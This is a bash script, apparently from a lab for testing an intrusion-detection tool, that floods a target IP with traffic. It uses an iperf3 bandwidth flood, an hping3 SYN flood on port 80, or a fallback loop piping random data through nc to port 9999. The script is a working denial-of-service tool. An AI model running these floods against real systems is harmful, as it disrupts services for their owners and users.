#!/usr/bin/env bash
# Run from the ATTACKER VM.
# Usage: bash traffic_flood.sh <target_ip> [duration_secs]
# Requires: hping3 OR iperf3

set -euo pipefail
TARGET="${1:?Usage: $0 <target_ip> [duration_secs]}"
DURATION="${2:-30}"

echo "[attacker] Traffic flood test against $TARGET for ${DURATION}s"

# Check available tools
if command -v iperf3 &>/dev/null; then
    echo "[attacker] Method: iperf3 bandwidth flood"
    echo "[attacker] NOTE: Start iperf3 server on defender first: iperf3 -s"
    echo "[attacker] Launching iperf3 client with 8 parallel streams..."
    iperf3 -c "$TARGET" -t "$DURATION" -P 8 -b 0

elif command -v hping3 &>/dev/null; then
    echo "[attacker] Method: hping3 SYN flood"
    echo "[attacker] Sending SYN flood to $TARGET:80 for ${DURATION}s..."
    timeout "$DURATION" hping3 --flood --syn -p 80 "$TARGET" || true

else
    echo "[attacker] Neither iperf3 nor hping3 found."
    echo "[attacker] Install: sudo apt install hping3 iperf3"
    echo "[attacker] Falling back to dd | nc stress test..."
    timeout "$DURATION" bash -c \
        "while true; do dd if=/dev/urandom bs=1M count=10 2>/dev/null | nc -q1 $TARGET 9999; done" || true
fi

echo "[attacker] Flood done. Check defender: tara-admin incidents -n 10"
